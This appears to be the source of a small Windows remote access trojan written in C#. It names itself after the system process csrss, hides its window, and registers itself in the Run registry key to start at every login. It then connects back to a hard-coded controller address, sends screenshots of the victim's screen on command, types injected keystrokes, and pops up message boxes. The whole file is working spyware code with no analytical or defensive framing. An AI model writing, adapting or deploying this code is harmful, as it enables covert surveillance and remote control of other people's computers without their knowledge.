using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace csrss
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        TcpClient client;
        NetworkStream stream;
        BinaryReader br;
        BinaryWriter bw;
        Bitmap b;
        Rectangle rec;
        string message = null;
        int type, lenght, H, W;
        byte[] buffer;
        bool isconnected = false;

        private void Form1_Load(object sender, EventArgs e)
        {
            Invisible();
            using (RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                rk.SetValue("Csrss", Application.ExecutablePath.ToString());
            }
            buffer = new byte[999999];
            client = new TcpClient();
            W = Screen.PrimaryScreen.Bounds.Width;
            H = Screen.PrimaryScreen.Bounds.Height;
            b = new Bitmap(W, H);
            rec = new Rectangle(0, 0, W, H);

            Thread ConnectionThread = new Thread(Connection);
            ConnectionThread.Start();

        }
        private void Connection()
        {
            while ( true )
            {
                try
                {
                    //client = new TcpClient("31.5.88.5", 1259);
                    client = new TcpClient("192.168.0.199", 1259);
                    stream = client.GetStream();
                    br = new BinaryReader(stream);
                    bw = new BinaryWriter(stream);
                    Thread HandlerThread = new Thread(Handler);
                    HandlerThread.Start();
                    return;
                }
                catch ( Exception ex )
                {
                    //Log(ex.ToString());
                    //Debug(ex.Message);
                }
                Thread.Sleep(1000);
            }
        }
        private void Handler()
        {
            while (true)
            {
                try
                {
                    type = br.ReadInt32();
                    if ( type == 1 )
                    {
                        lenght = br.ReadInt32();
                        buffer = br.ReadBytes(lenght);
                        ShowMessageBox(Encoding.ASCII.GetString(buffer));
                    }
                    if ( type == 2 )
                        TakePicture();
                    if ( type == 3 ) // press key
                    {
                        lenght = br.ReadInt32();
                        buffer = br.ReadBytes(lenght);
                        message = Encoding.ASCII.GetString(buffer);
                        SendKeys.Send(message);
                    }
                }
                catch ( Exception ex )
                {
                    //Log(ex.ToString());
                    //Debug(ex.Message);
                    Thread ConnectionThread = new Thread(Connection);
                    ConnectionThread.Start();
                    return;
                }

                Thread.Sleep(10);
            }
        }
        private void Invisible()
        {
            this.Hide();
            this.ControlBox = false;
            this.ShowInTaskbar = false;
            this.ShowIcon = false;

        }
        private void ShowMessageBox(string s) // type 1
        {
            try
            {
                int del = s.IndexOf(System.Environment.NewLine);
                string s1 = s.Substring(0, del);
                string s2 = s.Substring(del + 1, s.Length - del - 1);
                this.Invoke(new Action(() => { MessageBox.Show(s2, s1); }));
            }
            catch { }
        }
        private void TakePicture() // type 2
        {
            //Debug("pict");
            using (MemoryStream ms = new MemoryStream())
            using (Graphics g = Graphics.FromImage(b))
            {
                g.CopyFromScreen(0, 0, 0, 0, new Size(W, H));
                Cursor.Draw(g, new Rectangle(Cursor.Position, Cursor.Size));
                b.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                buffer = ms.ToArray();
            }
            //Debug(buffer.Length.ToString());
            //Debug(HabarNuAmCUmSaONumesc(buffer, 100));
            bw.Write(2);
            bw.Write(buffer.Length);
            bw.Write(buffer);
            bw.Flush();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            Debug(isconnected.ToString());
        }
        private void Debug(string s)
        {
            this.Invoke(new Action(() => { listBox1.Items.Add(s); listBox1.SelectedIndex = listBox1.Items.Count - 1; }));
        }
        public string HabarNuAmCUmSaONumesc(byte[] b, int n)
        {
            string s = null;
            if (n > 2000)
                n = 2000;
            for (int i = 0; i < n; ++i)
                s += " " + b[i].ToString();
            return s;
        }
        private void Log(string s)
        {
            s = System.DateTime.Now.ToString() + ":" + System.Environment.NewLine + s + System.Environment.NewLine + System.Environment.NewLine;
            File.AppendAllText(Application.ExecutablePath.ToString() + "Log.ini", s );
        }
    }
}
